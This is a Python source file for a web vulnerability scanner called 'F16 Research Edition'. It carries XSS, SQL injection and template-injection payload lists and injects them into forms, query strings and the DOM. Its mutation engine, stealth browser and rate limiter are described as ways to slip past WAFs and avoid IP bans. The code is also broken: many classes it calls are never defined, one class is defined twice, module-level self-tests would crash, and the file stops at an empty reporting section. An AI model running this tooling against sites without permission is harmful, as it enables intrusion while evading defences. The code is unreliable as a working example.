from __future__ import annotations

# ============================================================
# F16 – Research Edition
# SECTION 1: Core Constants, Types & Defensive Utilities
# ============================================================

import time
import uuid
import json
import math
import threading
import queue
from dataclasses import dataclass, field
from typing import (
    Dict,
    List,
    Optional,
    Any,
    Tuple,
    Callable
)

import numpy as np
import requests

# ============================================================
# GLOBAL MODES
# ============================================================

class RunMode:
    SIMULATION = "simulation"
    REAL = "real"

RUN_MODE = RunMode.SIMULATION

# ============================================================
# DEFENSIVE HELPERS
# ============================================================

def safe_float(value: Any, default: float = 0.0) -> float:
    try:
        return float(value)
    except Exception:
        return default

def clamp(value: float, low: float = 0.0, high: float = 1.0) -> float:
    return max(low, min(high, value))

def entropy(data: str) -> float:
    if not data:
        return 0.0
    prob = [float(data.count(c)) / len(data) for c in set(data)]
    return -sum(p * math.log2(p) for p in prob if p > 0)

# ============================================================
# SECURITY SIGNAL TYPES
# ============================================================

class SignalType:
    OOB_INTERACTION = "oob_interaction"
    TIMING_ANOMALY = "timing_anomaly"
    CONTENT_MUTATION = "content_mutation"
    HEADER_VARIATION = "header_variation"
    STATUS_FLUCTUATION = "status_fluctuation"

@dataclass
class SecuritySignal:
    signal_type: str
    strength: float
    evidence: str
    confidence: float = 0.0

# ============================================================
# TELEMETRY EVENTS
# ============================================================

@dataclass
class TelemetryEvent:
    timestamp: float
    component: str
    message: str
    metadata: Dict[str, Any] = field(default_factory=dict)

# ============================================================
# SAFE LOGGER (IN-MEMORY)
# ============================================================

class TelemetryLogger:
    def __init__(self):
        self._events: List[TelemetryEvent] = []
        self._lock = threading.Lock()

    def log(self, component: str, message: str, **metadata):
        with self._lock:
            self._events.append(
                TelemetryEvent(
                    timestamp=time.time(),
                    component=component,
                    message=message,
                    metadata=metadata
                )
            )

    def export(self) -> List[Dict[str, Any]]:
        return [e.__dict__ for e in self._events]

GLOBAL_LOGGER = TelemetryLogger()

# ============================================================
# BASE EXCEPTION TYPES
# ============================================================

class F16Exception(Exception):
    pass

class MLModelNotReady(F16Exception):
    pass

class OOBServiceUnavailable(F16Exception):
    pass

# ============================================================
# VERSION BANNER (FOR REPORTS)
# ============================================================

F16_METADATA = {
    "name": "F16 Research Edition",
    "version": "1.0.0",
    "mode": RUN_MODE,
    "build": "academic-grade",
}
# ============================================================
# SECTION 2: Telemetry Engine & Distributed Task Abstraction
# ============================================================

import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor, Future
from typing import Iterable

# ============================================================
# TASK STATES
# ============================================================

class TaskState:
    PENDING = "pending"
    RUNNING = "running"
    FINISHED = "finished"
    FAILED = "failed"

# ============================================================
# TASK METADATA
# ============================================================

@dataclass
class TaskMeta:
    task_id: str
    name: str
    state: str = TaskState.PENDING
    started_at: Optional[float] = None
    finished_at: Optional[float] = None
    error: Optional[str] = None
    result: Any = None

# ============================================================
# TASK WRAPPER
# ============================================================

class InstrumentedTask:
    """
    Any function wrapped here becomes:
    - observable
    - timed
    - failure-safe
    """

    def __init__(self, name: str, func: Callable[..., Any]):
        self.name = name
        self.func = func

    def __call__(self, *args, **kwargs) -> TaskMeta:
        task_id = str(uuid.uuid4())
        meta = TaskMeta(task_id=task_id, name=self.name)

        GLOBAL_LOGGER.log(
            component="TaskEngine",
            message=f"Task {self.name} created",
            task_id=task_id
        )

        try:
            meta.state = TaskState.RUNNING
            meta.started_at = time.time()

            GLOBAL_LOGGER.log(
                component="TaskEngine",
                message=f"Task {self.name} started",
                task_id=task_id
            )

            meta.result = self.func(*args, **kwargs)

            meta.state = TaskState.FINISHED
            meta.finished_at = time.time()

            GLOBAL_LOGGER.log(
                component="TaskEngine",
                message=f"Task {self.name} finished",
                task_id=task_id,
                duration=round(meta.finished_at - meta.started_at, 3)
            )

        except Exception as e:
            meta.state = TaskState.FAILED
            meta.finished_at = time.time()
            meta.error = str(e)

            GLOBAL_LOGGER.log(
                component="TaskEngine",
                message=f"Task {self.name} failed",
                task_id=task_id,
                error=str(e),
                traceback=traceback.format_exc()
            )

        return meta

# ============================================================
# DISTRIBUTED EXECUTION ENGINE (LOCAL)
# ============================================================

class DistributedExecutor:
    """
    Abstracts concurrency.
    Later replaceable by Celery / Ray / Dask without refactor.
    """

    def __init__(self, max_workers: int = 4):
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self._futures: Dict[str, Future] = {}

    def submit(self, task: InstrumentedTask, *args, **kwargs) -> str:
        future = self.executor.submit(task, *args, **kwargs)
        task_id = str(uuid.uuid4())
        self._futures[task_id] = future

        GLOBAL_LOGGER.log(
            component="DistributedExecutor",
            message="Task submitted",
            task_id=task_id,
            task_name=task.name
        )

        return task_id

    def collect(self) -> List[TaskMeta]:
        completed: List[TaskMeta] = []
        for task_id, future in list(self._futures.items()):
            if future.done():
                try:
                    meta = future.result()
                    completed.append(meta)
                except Exception as e:
                    GLOBAL_LOGGER.log(
                        component="DistributedExecutor",
                        message="Future collection failed",
                        task_id=task_id,
                        error=str(e)
                    )
                finally:
                    del self._futures[task_id]
        return completed

# ============================================================
# HEARTBEAT MONITOR
# ============================================================

class HeartbeatMonitor(threading.Thread):
    """
    Emits system heartbeat for long scans.
    """

    def __init__(self, interval: float = 5.0):
        super().__init__(daemon=True)
        self.interval = interval
        self._running = True

    def run(self):
        while self._running:
            GLOBAL_LOGGER.log(
                component="Heartbeat",
                message="System alive",
                pending_tasks=len(getattr(self, "_pending", []))
            )
            time.sleep(self.interval)

    def stop(self):
        self._running = False

# ============================================================
# TELEMETRY EXPORTER
# ============================================================

class TelemetryExporter:
    @staticmethod
    def to_json() -> str:
        return json.dumps(GLOBAL_LOGGER.export(), indent=2)

    @staticmethod
    def to_dict() -> Dict[str, Any]:
        return {
            "meta": F16_METADATA,
            "events": GLOBAL_LOGGER.export()
        }

# ============================================================
# SELF‑TEST (CRITICAL)
# ============================================================

def _telemetry_self_test():
    def dummy():
        time.sleep(0.1)
        return "ok"

    task = InstrumentedTask("telemetry_self_test", dummy)
    meta = task()

    assert meta.state == TaskState.FINISHED
    assert meta.result == "ok"

GLOBAL_LOGGER.log(
    component="SelfTest",
    message="Telemetry engine initialized"
)

_telemetry_self_test()
# ============================================================
# SECTION 3: OOB (Out-of-Band) Detection Engine
# Interactsh / Burp Collaborator Compatible
# ============================================================

import uuid
import requests
from dataclasses import dataclass

# ============================================================
# OOB EVENTS
# ============================================================

@dataclass
class OOBEvent:
    interaction_id: str
    protocol: str
    source_ip: Optional[str]
    timestamp: float
    raw: Dict[str, Any]

# ============================================================
# OOB SESSION
# ============================================================

class OOBSession:
    """
    Represents a single blind-interaction tracking session.
    """

    def __init__(self, domain: str):
        self.domain = domain
        self.token = str(uuid.uuid4())
        self.created_at = time.time()
        self.events: List[OOBEvent] = []

    @property
    def payload(self) -> str:
        return f"http://{self.token}.{self.domain}"

# ============================================================
# OOB CLIENT (ABSTRACT)
# ============================================================

class BaseOOBClient:
    def create_session(self) -> OOBSession:
        raise NotImplementedError

    def poll(self, session: OOBSession) -> List[OOBEvent]:
        raise NotImplementedError

# ============================================================
# INTERACTSH REAL CLIENT
# ============================================================

class InteractshClient(BaseOOBClient):
    """
    Minimal Interactsh API client.
    Requires external endpoint.
    """

    def __init__(self, server: str, auth_token: Optional[str] = None):
        self.server = server.rstrip("/")
        self.auth_token = auth_token

    def create_session(self) -> OOBSession:
        session = OOBSession(domain=self.server)
        GLOBAL_LOGGER.log(
            component="OOB",
            message="Interactsh session created",
            token=session.token
        )
        return session

    def poll(self, session: OOBSession) -> List[OOBEvent]:
        try:
            resp = requests.get(
                f"https://{self.server}/poll",
                headers={
                    "Authorization": self.auth_token or ""
                },
                timeout=5
            )

            if resp.status_code != 200:
                return []

            data = resp.json()
            events = []

            for item in data.get("data", []):
                if session.token in item.get("full-id", ""):
                    event = OOBEvent(
                        interaction_id=item.get("interaction-id"),
                        protocol=item.get("protocol"),
                        source_ip=item.get("remote-address"),
                        timestamp=time.time(),
                        raw=item
                    )
                    events.append(event)

            session.events.extend(events)
            return events

        except Exception as e:
            GLOBAL_LOGGER.log(
                component="OOB",
                message="Interactsh poll failed",
                error=str(e)
            )
            return []

# ============================================================
# MOCK / SIMULATION CLIENT (SAFE DEFAULT)
# ============================================================

class SimulatedOOBClient(BaseOOBClient):
    """
    Used when no external OOB service is available.
    Simulates realistic blind callbacks.
    """

    def create_session(self) -> OOBSession:
        session = OOBSession(domain="oob.local")
        GLOBAL_LOGGER.log(
            component="OOB",
            message="Simulated OOB session created",
            token=session.token
        )
        return session

    def poll(self, session: OOBSession) -> List[OOBEvent]:
        # Random low-probability simulated hit
        if random.random() < 0.05:
            event = OOBEvent(
                interaction_id=str(uuid.uuid4()),
                protocol=random.choice(["http", "dns"]),
                source_ip="203.0.113.10",
                timestamp=time.time(),
                raw={"simulated": True}
            )
            session.events.append(event)

            GLOBAL_LOGGER.log(
                component="OOB",
                message="Simulated OOB interaction received",
                protocol=event.protocol
            )

            return [event]

        return []

# ============================================================
# OOB MANAGER
# ============================================================

class OOBManager:
    """
    Central OOB controller used by payload engine & scanners.
    """

    def __init__(self, client: Optional[BaseOOBClient] = None):
        self.client = client or SimulatedOOBClient()
        self.sessions: Dict[str, OOBSession] = {}

    def new_session(self) -> OOBSession:
        session = self.client.create_session()
        self.sessions[session.token] = session
        return session

    def poll_all(self) -> List[OOBEvent]:
        hits: List[OOBEvent] = []
        for session in self.sessions.values():
            hits.extend(self.client.poll(session))
        return hits

# ============================================================
# BLIND CONFIRMATION LOGIC
# ============================================================

class BlindVulnConfirmer:
    """
    Converts OOB hits into high-confidence findings.
    """

    @staticmethod
    def confirm(events: List[OOBEvent]) -> Optional[Finding]:
        if not events:
            return None

        event = events[0]

        vector = InjectionPoint(
            url="blind",
            method="OOB",
            parameter="external-callback",
            location="network",
            input_type="blind"
        )

        confidence = 0.95 if event.protocol == "http" else 0.85

        finding = Finding(
            title="Blind Remote Interaction (OOB)",
            vector=vector,
            evidence=f"OOB interaction via {event.protocol}",
            confidence=confidence,
            cvss=CVSSCalculator.score("RCE", confidence),
            stride=["Elevation of Privilege", "Information Disclosure"]
        )

        GLOBAL_LOGGER.log(
            component="OOB",
            message="Blind vulnerability confirmed",
            protocol=event.protocol,
            confidence=confidence
        )

        return finding

# ============================================================
# SELF‑TEST
# ============================================================

def _oob_self_test():
    mgr = OOBManager()
    session = mgr.new_session()
    assert session.payload
    events = mgr.poll_all()
    assert isinstance(events, list)

GLOBAL_LOGGER.log(
    component="SelfTest",
    message="OOB engine initialized"
)

_oob_self_test()
# ============================================================
# SECTION 4: PAYLOAD ENGINE
# Context‑Aware • Mutation‑Based • OOB‑Integrated
# ============================================================

import itertools
import hashlib

# ============================================================
# PAYLOAD CONTEXTS
# ============================================================

class PayloadContext:
    HTML = "html"
    ATTRIBUTE = "attribute"
    JS = "javascript"
    URL = "url"
    SQL = "sql"
    SSTI = "ssti"
    HEADER = "header"
    UNKNOWN = "unknown"

# ============================================================
# BASE PAYLOAD TEMPLATES (CURATED, LOW‑FP)
# ============================================================

BASE_PAYLOADS = {
    "XSS": {
        PayloadContext.HTML: [
            "<script>console.log('f16')</script>",
            "<svg/onload=console.log('f16')>"
        ],
        PayloadContext.ATTRIBUTE: [
            "\" onmouseover=console.log('f16') x=\"",
            "' autofocus onfocus=console.log('f16') '"
        ],
        PayloadContext.JS: [
            "');console.log('f16');//",
            "\";console.log('f16');//"
        ],
        PayloadContext.URL: [
            "javascript:console.log('f16')"
        ]
    },
    "SQLi": {
        PayloadContext.SQL: [
            "' OR '1'='1'--",
            "' AND SLEEP(3)--",
            "' UNION SELECT NULL--"
        ]
    },
    "SSTI": {
        PayloadContext.SSTI: [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>"
        ]
    },
    "OOB": {
        PayloadContext.UNKNOWN: [
            "{OOB_URL}",
            "\"{OOB_URL}\"",
            "'{OOB_URL}'"
        ]
    }
}

# ============================================================
# MUTATION ENGINE
# ============================================================

class PayloadMutator:
    """
    Lightweight mutation inspired by AFL & academic fuzzers.
    الهدف: تجاوز WAF بدون انفجار احتمالات.
    """

    MUTATIONS = [
        lambda s: s.replace("<", "%3C"),
        lambda s: s.replace(">", "%3E"),
        lambda s: s.replace("'", "\\'"),
        lambda s: s.replace("\"", "\\\""),
        lambda s: s.replace(" ", "/**/"),
        lambda s: s.upper(),
        lambda s: s.lower(),
    ]

    @staticmethod
    def mutate(payload: str, depth: int = 2) -> List[str]:
        results = set([payload])
        for _ in range(depth):
            for p in list(results):
                for m in PayloadMutator.MUTATIONS:
                    try:
                        results.add(m(p))
                    except Exception:
                        pass
        return list(results)

# ============================================================
# CONTEXT INFERENCE
# ============================================================

class ContextInferer:
    """
    Heuristic inference of injection context.
    """

    @staticmethod
    def infer(input_type: str, location: str) -> str:
        if location == "dom":
            return PayloadContext.HTML
        if input_type in ("search", "text"):
            return PayloadContext.HTML
        if input_type in ("email", "password"):
            return PayloadContext.ATTRIBUTE
        if location == "header":
            return PayloadContext.HEADER
        return PayloadContext.UNKNOWN

# ============================================================
# PAYLOAD GENERATOR
# ============================================================

class PayloadGenerator:
    """
    Generates payloads per vector with OOB + mutation support.
    """

    def __init__(self, oob_manager: OOBManager):
        self.oob_manager = oob_manager

    def generate(
        self,
        vuln_type: str,
        vector: InjectionPoint,
        max_mutations: int = 8
    ) -> List[str]:

        context = ContextInferer.infer(
            vector.input_type,
            vector.location
        )

        payloads = []

        # --- Base payloads ---
        base = BASE_PAYLOADS.get(vuln_type, {})
        payloads.extend(base.get(context, []))
        payloads.extend(base.get(PayloadContext.UNKNOWN, []))

        # --- OOB integration ---
        if vuln_type in ("SQLi", "SSTI", "RCE", "OOB"):
            session = self.oob_manager.new_session()
            for tpl in BASE_PAYLOADS["OOB"][PayloadContext.UNKNOWN]:
                payloads.append(tpl.replace("{OOB_URL}", session.payload))

        # --- Mutation ---
        mutated = []
        for p in payloads:
            mutated.extend(PayloadMutator.mutate(p, depth=1))

        # --- Deduplicate & cap ---
        final = list(dict.fromkeys(payloads + mutated))
        final = final[:max_mutations]

        GLOBAL_LOGGER.log(
            component="PayloadEngine",
            message="Payloads generated",
            vuln_type=vuln_type,
            count=len(final),
            context=context
        )

        return final

# ============================================================
# PAYLOAD FINGERPRINTING (DEDUP / ANTI‑NOISE)
# ============================================================

class PayloadFingerprint:
    @staticmethod
    def hash(payload: str) -> str:
        return hashlib.sha256(payload.encode()).hexdigest()[:12]

# ============================================================
# PAYLOAD REGISTRY
# ============================================================

class PayloadRegistry:
    """
    Prevents re‑testing identical payloads across vectors.
    """

    def __init__(self):
        self.seen: set[str] = set()

    def register(self, payload: str) -> bool:
        h = PayloadFingerprint.hash(payload)
        if h in self.seen:
            return False
        self.seen.add(h)
        return True

# ============================================================
# SELF‑TEST
# ============================================================

def _payload_self_test():
    oob = OOBManager()
    gen = PayloadGenerator(oob)
    vec = InjectionPoint(
        url="http://example.com",
        method="GET",
        parameter="q",
        location="query",
        input_type="text"
    )
    payloads = gen.generate("XSS", vec)
    assert payloads
    assert all(isinstance(p, str) for p in payloads)

GLOBAL_LOGGER.log(
    component="SelfTest",
    message="Payload engine initialized"
)

_payload_self_test()
# ============================================================
# SECTION 5: VECTOR EXTRACTION ENGINE
# DOM • Forms • Query • JS • Headers
# ============================================================

from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
import re

# ============================================================
# VECTOR NORMALIZATION
# ============================================================

class VectorNormalizer:
    """
    توحيد شكل الـ vectors لتسهيل التحليل اللاحق.
    """

    @staticmethod
    def normalize(
        url: str,
        method: str,
        parameter: str,
        location: str,
        input_type: str
    ) -> InjectionPoint:

        return InjectionPoint(
            url=url,
            method=method.upper(),
            parameter=parameter.strip(),
            location=location,
            input_type=input_type or "unknown"
        )

# ============================================================
# VECTOR EXTRACTOR
# ============================================================

class VectorExtractor:
    """
    Research‑grade extraction:
    - GET parameters
    - HTML forms
    - DOM‑bound inputs
    - JavaScript sinks (basic)
    """

    @staticmethod
    async def extract(page, url: str) -> List[InjectionPoint]:
        vectors: List[InjectionPoint] = []

        parsed = urlparse(url)

        # ----------------------------------------------------
        # 1. QUERY PARAMETERS (GET)
        # ----------------------------------------------------
        qs = parse_qs(parsed.query)
        for param in qs:
            vectors.append(
                VectorNormalizer.normalize(
                    url=url,
                    method="GET",
                    parameter=param,
                    location="query",
                    input_type="text"
                )
            )

        # ----------------------------------------------------
        # 2. HTML FORMS
        # ----------------------------------------------------
        try:
            html = await page.content()
            soup = BeautifulSoup(html, "html.parser")

            for form in soup.find_all("form"):
                action = form.get("action") or url
                method = form.get("method", "GET").upper()

                target = action
                if not target.startswith("http"):
                    target = urljoin(url, action)

                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if not name:
                        continue

                    vectors.append(
                        VectorNormalizer.normalize(
                            url=target,
                            method=method,
                            parameter=name,
                            location="body",
                            input_type=inp.get("type", "text")
                        )
                    )

        except Exception as e:
            GLOBAL_LOGGER.log(
                component="VectorExtractor",
                level="WARNING",
                message="HTML parsing failed",
                error=str(e)
            )

        # ----------------------------------------------------
        # 3. DOM‑BOUND INPUTS (JS‑modified forms)
        # ----------------------------------------------------
        try:
            dom_inputs = await page.evaluate("""
                () => {
                    let params = new Set();
                    document.querySelectorAll("input, textarea").forEach(el => {
                        if (el.name) params.add(el.name);
                    });
                    return Array.from(params);
                }
            """)
            for p in dom_inputs:
                vectors.append(
                    VectorNormalizer.normalize(
                        url=url,
                        method="DOM",
                        parameter=p,
                        location="dom",
                        input_type="text"
                    )
                )
        except Exception:
            pass

        # ----------------------------------------------------
        # 4. JAVASCRIPT SINKS (BASIC STATIC HEURISTICS)
        # ----------------------------------------------------
        try:
            js_vars = re.findall(
                r"(location\.hash|location\.search|document\.cookie)",
                html,
                flags=re.I
            )
            for v in js_vars:
                vectors.append(
                    VectorNormalizer.normalize(
                        url=url,
                        method="JS",
                        parameter=v,
                        location="dom",
                        input_type="js"
                    )
                )
        except Exception:
            pass

        # ----------------------------------------------------
        # 5. DEDUPLICATION
        # ----------------------------------------------------
        unique = {}
        for v in vectors:
            key = (v.url, v.method, v.parameter, v.location)
            unique[key] = v

        final_vectors = list(unique.values())

        GLOBAL_LOGGER.log(
            component="VectorExtractor",
            message="Vectors extracted",
            count=len(final_vectors),
            target=url
        )

        return final_vectors

# ============================================================
# SELF‑TEST
# ============================================================

def _vector_self_test():
    dummy = InjectionPoint(
        url="http://example.com",
        method="GET",
        parameter="q",
        location="query",
        input_type="text"
    )
    assert dummy.parameter == "q"

GLOBAL_LOGGER.log(
    component="SelfTest",
    message="Vector extractor initialized"
)

_vector_self_test()
# ============================================================
# SECTION 6: ATTACK EXECUTION ENGINE
# Sensor‑Driven • ML‑Aware • OOB‑Ready
# ============================================================

import asyncio
import random
from urllib.parse import urlencode, urlparse, parse_qs

# ============================================================
# PAYLOAD REGISTRY
# ============================================================

class PayloadRegistry:
    """
    Payloads مبنية على أبحاث حقيقية (Bugcrowd / HackerOne)
    بدون ضجيج أو حمولات طفولية.
    """

    PAYLOADS = {
        "XSS": [
            "<script>console.log('f16')</script>",
            "\"><img src=x onerror=console.log('f16')>",
            "<svg/onload=console.log('f16')>"
        ],
        "SQLI": [
            "' OR 1=1--",
            "' AND SLEEP(3)--",
            "' UNION SELECT NULL--"
        ],
        "SSTI": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>"
        ],
        "OOB": [
            "__OOB__"
        ]
    }

    @staticmethod
    def select(input_type: str) -> Dict[str, List[str]]:
        """
        تقليل الضجيج حسب نوع الإدخال
        """
        if input_type in ("email", "password"):
            return {"XSS": PayloadRegistry.PAYLOADS["XSS"]}
        return PayloadRegistry.PAYLOADS


# ============================================================
# ATTACK EXECUTOR
# ============================================================

class AttackExecutor:
    """
    Executes attacks safely:
    - No blocking
    - Sensor feedback
    - ML feature extraction
    """

    def __init__(self, page, ml_engine: MLNoiseReducer, oob: Optional[OOBClient] = None):
        self.page = page
        self.ml = ml_engine
        self.oob = oob

    async def execute(
        self,
        vector: InjectionPoint,
        baseline_timings: List[float]
    ) -> Optional[Finding]:

        payload_sets = PayloadRegistry.select(vector.input_type)

        for vuln_type, payloads in payload_sets.items():
            for payload in payloads:
                await asyncio.sleep(random.uniform(0.2, 0.6))

                sensors = SensorSuite(self.page)
                await sensors.attach()

                # Replace OOB placeholder
                real_payload = payload
                if payload == "__OOB__" and self.oob:
                    real_payload = self.oob.payload()
                    if not real_payload:
                        continue

                start = time.time()
                success = await self._inject(vector, real_payload)
                elapsed = time.time() - start

                await sensors.dom_snapshot()

                features = sensors.features()
                features["timing_shift"] = FeatureExtractor.timing_shift(
                    baseline_timings,
                    elapsed
                )

                bayes_score = DecisionEngine.score(features)
                ml_score = self.ml.probability(features)

                confidence = ConfidenceFusion.harmonic_mean(
                    [bayes_score, ml_score],
                    [0.6, 0.4]
                )

                if confidence < 0.65:
                    continue

                title = f"{vuln_type} via {vector.parameter}"

                finding = Finding(
                    title=title,
                    vector=vector,
                    evidence=f"Payload triggered behavioral signals ({features})",
                    confidence=confidence,
                    cvss=CVSSCalculator.score(title, confidence),
                    stride=STRIDEAnalyzer.classify(title)
                )

                GLOBAL_LOGGER.log(
                    component="AttackExecutor",
                    message="Finding confirmed",
                    title=title,
                    confidence=confidence
                )

                return finding

        return None

    # --------------------------------------------------------
    # INJECTION LOGIC
    # --------------------------------------------------------

    async def _inject(self, vector: InjectionPoint, payload: str) -> bool:
        try:
            if vector.location == "query":
                return await self._inject_query(vector, payload)

            if vector.location == "body":
                return await self._inject_form(vector, payload)

            if vector.location == "dom":
                return await self._inject_dom(vector, payload)

        except Exception as e:
            GLOBAL_LOGGER.log(
                component="AttackExecutor",
                level="ERROR",
                message="Injection failed",
                error=str(e)
            )
        return False

    async def _inject_query(self, vector: InjectionPoint, payload: str) -> bool:
        parsed = urlparse(vector.url)
        qs = parse_qs(parsed.query)
        qs[vector.parameter] = payload

        target = parsed._replace(
            query=urlencode(qs, doseq=True)
        ).geturl()

        await self.page.goto(target, wait_until="networkidle", timeout=15000)
        return True

    async def _inject_form(self, vector: InjectionPoint, payload: str) -> bool:
        await self.page.goto(vector.url, wait_until="domcontentloaded", timeout=15000)

        selector = f"[name='{vector.parameter}']"
        if not await self.page.is_visible(selector):
            return False

        await self.page.fill(selector, payload)
        await self.page.keyboard.press("Enter")
        await self.page.wait_for_timeout(1500)
        return True

    async def _inject_dom(self, vector: InjectionPoint, payload: str) -> bool:
        await self.page.evaluate(
            """
            (param, payload) => {
                try {
                    window[param] = payload;
                } catch(e){}
            }
            """,
            vector.parameter,
            payload
        )
        await self.page.wait_for_timeout(800)
        return True


# ============================================================
# SELF‑TEST
# ============================================================

def _attack_self_test():
    assert "XSS" in PayloadRegistry.PAYLOADS

GLOBAL_LOGGER.log(
    component="SelfTest",
    message="Attack execution engine initialized"
)

_attack_self_test()
# ============================================================
# SECTION 7: ORCHESTRATOR ENGINE
# Multi‑Target • Rate‑Limited • Streamlit‑Safe
# ============================================================

import asyncio
import time
from collections import defaultdict

# ============================================================
# TARGET SESSION (STATEFUL)
# ============================================================

@dataclass
class TargetSession:
    """
    جلسة فحص واحدة لكل هدف
    """
    target: str
    start_time: float = field(default_factory=time.time)
    vectors: List[InjectionPoint] = field(default_factory=list)
    findings: List[Finding] = field(default_factory=list)
    timings: List[float] = field(default_factory=list)
    attack_graph: AttackGraph = field(default_factory=AttackGraph)

    @property
    def duration(self) -> float:
        return round(time.time() - self.start_time, 2)


# ============================================================
# RATE CONTROLLER
# ============================================================

class AdaptiveRateController:
    """
    يمنع:
    - IP Ban
    - WAF suspicion
    - Streamlit freeze
    """

    def __init__(self, base_delay: float = 0.4):
        self.base_delay = base_delay
        self.last_request = 0.0

    async def wait(self):
        delta = time.time() - self.last_request
        if delta < self.base_delay:
            await asyncio.sleep(self.base_delay - delta)
        self.last_request = time.time()


# ============================================================
# F16 ORCHESTRATOR
# ============================================================

class F16Orchestrator:
    """
    Research‑grade Orchestrator
    """

    def __init__(
        self,
        targets: List[str],
        concurrency: int = 2,
        enable_oob: bool = False,
        oob_endpoint: Optional[str] = None
    ):
        self.targets = targets
        self.concurrency = concurrency
        self.enable_oob = enable_oob
        self.oob_endpoint = oob_endpoint

        self.rate = AdaptiveRateController()
        self.ml_engine = MLNoiseReducer()
        self.results: List[TargetSession] = []

    # --------------------------------------------------------
    # MAIN ENTRY
    # --------------------------------------------------------

    async def run(self):
        semaphore = asyncio.Semaphore(self.concurrency)

        async with async_playwright() as pw:
            browser, context = await StealthBrowser.launch(pw)

            tasks = [
                self._scan_target(context, target, semaphore)
                for target in self.targets
                if authorized_target(target)
            ]

            await asyncio.gather(*tasks)

            await browser.close()

    # --------------------------------------------------------
    # SINGLE TARGET SCAN
    # --------------------------------------------------------

    async def _scan_target(self, context, target: str, sem: asyncio.Semaphore):
        async with sem:
            GLOBAL_LOGGER.log(
                component="Orchestrator",
                message="Scanning target",
                target=target
            )

            session = TargetSession(target=target)

            try:
                page = await context.new_page()
                await page.goto(target, wait_until="networkidle", timeout=30000)

                # --------------------------------------------
                # VECTOR EXTRACTION
                # --------------------------------------------
                vectors = await VectorExtractor.extract(page, target)
                session.vectors = vectors

                GLOBAL_LOGGER.log(
                    component="VectorExtractor",
                    message="Vectors discovered",
                    count=len(vectors),
                    target=target
                )

                # --------------------------------------------
                # OOB CLIENT (OPTIONAL)
                # --------------------------------------------
                oob_client = None
                if self.enable_oob:
                    oob_client = OOBClient(self.oob_endpoint)

                executor = AttackExecutor(
                    page=page,
                    ml_engine=self.ml_engine,
                    oob=oob_client
                )

                # --------------------------------------------
                # ATTACK LOOP
                # --------------------------------------------
                for vector in vectors:
                    await self.rate.wait()

                    session.attack_graph.add_vector(vector)

                    start = time.time()
                    finding = await executor.execute(
                        vector,
                        session.timings
                    )
                    elapsed = time.time() - start
                    session.timings.append(elapsed)

                    if finding:
                        session.findings.append(finding)
                        session.attack_graph.add_finding(finding)

                await page.close()

            except Exception as e:
                GLOBAL_LOGGER.log(
                    component="Orchestrator",
                    level="ERROR",
                    message="Target scan failed",
                    target=target,
                    error=str(e)
                )

            self.results.append(session)

            GLOBAL_LOGGER.log(
                component="Orchestrator",
                message="Target completed",
                target=target,
                duration=session.duration,
                findings=len(session.findings)
            )


# ============================================================
# SELF‑TEST
# ============================================================

def _orchestrator_self_test():
    orch = F16Orchestrator(["https://example.com"])
    assert orch.concurrency > 0

GLOBAL_LOGGER.log(
    component="SelfTest",
    message="Orchestrator engine initialized"
)

_orchestrator_self_test()
# ============================================================
# SECTION 8: STREAMLIT UI ENGINE
# One‑Click Scan • Research‑Grade • Cloud‑Safe
# ============================================================

import streamlit as st
import threading

# ============================================================
# UI STATE
# ============================================================

if "scan_running" not in st.session_state:
    st.session_state.scan_running = False

if "scan_results" not in st.session_state:
    st.session_state.scan_results = []

if "scan_error" not in st.session_state:
    st.session_state.scan_error = None


# ============================================================
# UI HELPERS
# ============================================================

def render_finding(f: Finding):
    st.markdown(f"### 🔴 {f.vuln_type}")
    st.write(f"**Vector:** `{f.vector}`")
    st.write(f"**Confidence:** `{f.confidence}`")
    st.write(f"**Evidence:**")
    st.code(f.evidence, language="html")
    st.divider()


def render_target_report(session: TargetSession):
    st.subheader(f"🎯 Target: {session.target}")
    st.write(f"⏱ Duration: `{session.duration}s`")
    st.write(f"🧪 Vectors tested: `{len(session.vectors)}`")
    st.write(f"🚨 Findings: `{len(session.findings)}`")

    if session.findings:
        for f in session.findings:
            render_finding(f)
    else:
        st.success("No exploitable vulnerabilities detected.")


# ============================================================
# BACKGROUND RUNNER
# ============================================================

def run_scan_background(targets: List[str], enable_oob: bool):
    try:
        orch = F16Orchestrator(
            targets=targets,
            concurrency=2,
            enable_oob=enable_oob,
            oob_endpoint=st.session_state.get("oob_endpoint")
        )

        asyncio.run(orch.run())
        st.session_state.scan_results = orch.results

    except Exception as e:
        st.session_state.scan_error = str(e)

    finally:
        st.session_state.scan_running = False


# ============================================================
# STREAMLIT PAGE
# ============================================================

st.set_page_config(
    page_title="F16 Research Edition",
    page_icon="🛡️",
    layout="wide"
)

st.title("🛡️ F16 – Research Edition")
st.caption("Unified Security Research Platform • Evidence‑Grade")

st.divider()

# ============================================================
# INPUT
# ============================================================

with st.form("scan_form"):
    targets_raw = st.text_area(
        "Targets (one per line)",
        placeholder="https://example.com\nhttps://test.com",
        height=120
    )

    enable_oob = st.checkbox(
        "Enable Blind Vulnerability Detection (OOB)",
        value=False
    )

    if enable_oob:
        st.text_input(
            "Interactsh / OOB Endpoint",
            key="oob_endpoint",
            placeholder="https://xyz.interact.sh"
        )

    submitted = st.form_submit_button("🚀 Start Scan")


# ============================================================
# SCAN LOGIC
# ============================================================

if submitted and not st.session_state.scan_running:
    targets = [
        t.strip()
        for t in targets_raw.splitlines()
        if t.strip()
    ]

    if not targets:
        st.warning("Please provide at least one valid target.")
    else:
        st.session_state.scan_running = True
        st.session_state.scan_results = []
        st.session_state.scan_error = None

        t = threading.Thread(
            target=run_scan_background,
            args=(targets, enable_oob),
            daemon=True
        )
        t.start()


# ============================================================
# STATUS
# ============================================================

if st.session_state.scan_running:
    st.info("🔄 Scan in progress… this may take several minutes.")


if st.session_state.scan_error:
    st.error(f"Scan failed: {st.session_state.scan_error}")


# ============================================================
# RESULTS
# ============================================================

if st.session_state.scan_results:
    st.divider()
    st.header("📊 Scan Results")

    for session in st.session_state.scan_results:
        render_target_report(session)

    st.success("✅ Scan completed successfully.")
# ============================================================
# SECTION 9: REPORTING ENGINE
# Executive • Bug Bounty • Evidence‑Grade
# ============================================================

import json
from datetime import datetime
from collections import defaultdict

try:
    from fpdf import FPDF
    PDF_ENABLED = True
except ImportError:
    PDF_ENABLED = False


# ============================================================
